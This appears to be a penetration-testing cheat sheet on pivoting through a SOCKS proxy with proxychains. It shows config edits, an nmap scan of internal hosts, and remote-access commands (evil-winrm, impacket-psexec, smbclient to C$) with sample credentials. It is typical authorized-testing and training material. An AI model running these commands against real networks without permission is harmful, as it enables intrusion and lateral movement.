# PROXYCHAINS CONFIGURATION

### Edit proxychains config

```bash
nano /etc/proxychains4.conf
Set: socks5 127.0.0.1 1080
```

> Point to your SOCKS proxy

**Why:** Match port from SSH -D or chisel

<details>
<summary>Example Output</summary>

```
nano /etc/proxychains4.conf

# Add at bottom:
socks5 127.0.0.1 1080

# Make sure only ONE proxy line is uncommented
# Match port to your SSH -D or chisel SOCKS port
```
</details>

---

### Use strict_chain

```bash
Set: strict_chain
Comment out: random_chain, dynamic_chain
```

> Sequential proxy chain

**Why:** Most reliable for single pivot

<details>
<summary>Example Output</summary>

```
/etc/proxychains4.conf:
strict_chain  <- uncomment this
#random_chain <- comment this
#dynamic_chain <- comment this

(strict = goes through proxies in order, most reliable)
```
</details>

---

### Nmap through proxychains

```bash
proxychains nmap -sT -Pn -p 21,22,80,443,445,3389 INTERNAL_IP
```

> Must use -sT (TCP connect)
Must use -Pn (no ping)

**Why:** SYN scan won't work through SOCKS

<details>
<summary>Example Output</summary>

```
proxychains nmap -sT -Pn -p 21,22,80,445,3389 172.16.1.10

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
(Internal host enumeration through pivot)
```
</details>

---

### Full toolkit through proxy

```bash
proxychains crackmapexec smb INTERNAL/24
proxychains evil-winrm -i INTERNAL_IP
proxychains impacket-psexec domain/user@INTERNAL_IP
```

> Any tool through proxy

**Why:** Treat internal network as local

<details>
<summary>Example Output</summary>

```
proxychains evil-winrm -i 172.16.1.10 -u admin -p Pass
proxychains impacket-psexec corp/admin@172.16.1.10
proxychains xfreerdp /u:admin /p:Pass /v:172.16.1.10
proxychains smbclient //172.16.1.10/C$ -U admin
(Every tool works through the proxy)
```
</details>

---
